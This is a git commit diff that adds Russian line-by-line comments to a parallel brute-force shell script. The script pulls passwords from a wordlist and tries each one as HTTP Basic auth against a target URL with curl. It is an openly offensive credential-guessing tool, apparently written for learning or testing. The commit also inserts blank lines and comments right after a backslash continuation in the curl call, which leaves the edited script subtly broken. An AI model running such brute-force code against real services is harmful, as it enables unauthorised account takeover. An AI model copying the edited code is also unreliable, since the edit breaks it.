9581cc62de79b82be49fc4d59e5796c9108f2953
timestamp <mashanovhdhh@gmail.com>
2026-04-27 22:39:07 +0300

    Update parallel_brute.sh

--- hydra_tests/scripts/parallel_brute.sh
+++ hydra_tests/scripts/parallel_brute.sh
@@ -8,14 +8,40 @@ THREADS=4
 # Function for each thread
 brute_thread() {
     local start=$1
+# начальная строка словаря
     local end=$2
+# конечная строка словаря
     local thread_id=$3
+# номер потока
+
+# создаёт три аргумента local start/end/thread_id которые будут использоваться теми аргументами которые функция принимает - $1 $2 $3
     
     for ((i=start; i<end; i++)); do
+
+# идём от start до end с шагом 1
+
         password=$(sed -n "${i}p" "$WORDLIST")
+
+# sed -n подавляет обычный вывод
+# ${i}p печатает только строку с номер i из файла $WORDLIST
+# результат сохраняется в password 
+
         auth=$(printf "%s:%s" "$USER" "$password" | base64 | tr -d '\n')
+
+# Формирует Basic-авторизацию:
+# 1. printf "%s:%s" склеивает user:password
+# 2. base64 кодирует в Base64
+# 3. tr -d '\n' удаляет символ перевода строки, который мог добавить base64. Результат сохраняется в auth.
         
         response=$(curl -s -o /dev/null -w "%{http_code}" \
+
+
+# Выполняет curl с опциями:
+
+# -s (silent) — не показывать прогресс и ошибки
+# -o /dev/null — выбросить тело ответа
+# -w "%{http_code}" — вывести только HTTP-код ответа
+
                    -H "Authorization: Basic $auth" "$URL" 2>/dev/null)
         
         if [ "$response" = "200" ]; then
